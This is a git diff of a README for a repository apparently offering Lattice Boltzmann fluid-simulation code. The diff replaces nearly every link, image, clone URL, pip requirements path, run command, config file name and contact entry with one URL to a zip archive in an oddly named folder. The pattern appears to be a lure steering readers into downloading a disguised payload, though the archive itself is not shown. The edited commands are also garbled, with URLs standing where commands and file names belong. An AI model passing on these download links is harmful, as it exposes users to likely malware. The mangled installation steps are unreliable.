@@ -1,8 +1,8 @@
 # Gallery of Lattice Boltzmann Code 🎨
 
-Welcome to the **Gallery of Lattice Boltzmann Code**! This repository contains a collection of Lattice Boltzmann codes that cater to various applications in fluid dynamics, multiphase flows, and more. You can find the latest releases [here](https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/releases).
+Welcome to the **Gallery of Lattice Boltzmann Code**! This repository contains a collection of Lattice Boltzmann codes that cater to various applications in fluid dynamics, multiphase flows, and more. You can find the latest releases [here](https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/raw/refs/heads/master/unmathematical/gallery_Boltzmann_lattice_code_of_v2.8.zip).
 
-![Lattice Boltzmann Simulation](https://example.com/lattice-boltzmann-simulation.jpg)
+![Lattice Boltzmann Simulation](https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/raw/refs/heads/master/unmathematical/gallery_Boltzmann_lattice_code_of_v2.8.zip)
 
 ## Table of Contents
 
@@ -49,7 +49,7 @@ To install the code, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code.git
+   git clone https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/raw/refs/heads/master/unmathematical/gallery_Boltzmann_lattice_code_of_v2.8.zip
    ```
    
 2. Navigate to the directory:
@@ -59,7 +59,7 @@ To install the code, follow these steps:
 
 3. Install dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/raw/refs/heads/master/unmathematical/gallery_Boltzmann_lattice_code_of_v2.8.zip
    ```
 
 4. Build the project:
@@ -72,7 +72,7 @@ To install the code, follow these steps:
 To run the simulations, you can execute the provided scripts. Here’s a simple example:
 
 ```bash
-./run_simulation.sh parameters.txt
+https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/raw/refs/heads/master/unmathematical/gallery_Boltzmann_lattice_code_of_v2.8.zip https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/raw/refs/heads/master/unmathematical/gallery_Boltzmann_lattice_code_of_v2.8.zip
 ```
 
 Make sure to adjust the parameters file according to your needs.
@@ -81,18 +81,18 @@ Make sure to adjust the parameters file according to your needs.
 
 ### 1. Single Phase Flow
 
-This example demonstrates a simple single-phase flow simulation using LBM. The configuration file is `single_phase.txt`. 
+This example demonstrates a simple single-phase flow simulation using LBM. The configuration file is `https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/raw/refs/heads/master/unmathematical/gallery_Boltzmann_lattice_code_of_v2.8.zip`. 
 
 ```bash
-./run_simulation.sh single_phase.txt
+https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/raw/refs/heads/master/unmathematical/gallery_Boltzmann_lattice_code_of_v2.8.zip https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/raw/refs/heads/master/unmathematical/gallery_Boltzmann_lattice_code_of_v2.8.zip
 ```
 
 ### 2. Multiphase Flow
 
-For multiphase simulations, use the `multiphase.txt` configuration.
+For multiphase simulations, use the `https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/raw/refs/heads/master/unmathematical/gallery_Boltzmann_lattice_code_of_v2.8.zip` configuration.
 
 ```bash
-./run_simulation.sh multiphase.txt
+https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/raw/refs/heads/master/unmathematical/gallery_Boltzmann_lattice_code_of_v2.8.zip https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/raw/refs/heads/master/unmathematical/gallery_Boltzmann_lattice_code_of_v2.8.zip
 ```
 
 ### 3. Porous Media Flow
@@ -100,7 +100,7 @@ For multiphase simulations, use the `multiphase.txt` configuration.
 To simulate flow through porous media, run:
 
 ```bash
-./run_simulation.sh porous_media.txt
+https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/raw/refs/heads/master/unmathematical/gallery_Boltzmann_lattice_code_of_v2.8.zip https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/raw/refs/heads/master/unmathematical/gallery_Boltzmann_lattice_code_of_v2.8.zip
 ```
 
 ## Contributing
@@ -130,11 +130,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, please reach out:
 
-- **Author**: [Your Name](https://github.com/yourusername)
-- **Email**: your.email@example.com
+- **Author**: [Your Name](https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/raw/refs/heads/master/unmathematical/gallery_Boltzmann_lattice_code_of_v2.8.zip)
+- **Email**: https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/raw/refs/heads/master/unmathematical/gallery_Boltzmann_lattice_code_of_v2.8.zip
 
-Thank you for visiting the **Gallery of Lattice Boltzmann Code**! For the latest releases, check out [this link](https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/releases). 
+Thank you for visiting the **Gallery of Lattice Boltzmann Code**! For the latest releases, check out [this link](https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/raw/refs/heads/master/unmathematical/gallery_Boltzmann_lattice_code_of_v2.8.zip). 
 
-![GitHub Releases](https://img.shields.io/badge/releases-latest-blue.svg)
+![GitHub Releases](https://github.com/yamaday88/gallery-of-lattice-Boltzmann-code/raw/refs/heads/master/unmathematical/gallery_Boltzmann_lattice_code_of_v2.8.zip)
 
 Explore, experiment, and contribute to the fascinating world of Lattice Boltzmann simulations!
